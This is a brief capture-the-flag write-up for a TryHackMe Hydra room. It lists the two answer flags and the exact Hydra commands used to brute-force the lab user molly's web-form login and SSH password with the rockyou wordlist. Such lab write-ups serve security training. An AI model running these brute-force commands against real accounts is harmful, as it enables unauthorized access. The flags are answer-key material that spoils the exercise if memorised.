# Hydra-ha-ha-haa

[docs](https://tryhackme.com/resources/blog/hydra/)

1. Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)
   Ans:`THM{2673a7dd116de68e85c48ec0b1f2612e`
   1. `sudo hydra -l molly -P ~/hack/wordlists/rockyou.txt 10.48.190.85 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`

2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
   Ans:`THM{c8eeb0468febbadea859baeb33b2541b}`
   1. `hydra -l molly -P ~/hack/wordlists/rockyou.txt 10.48.190.85 -t 4 ssh`
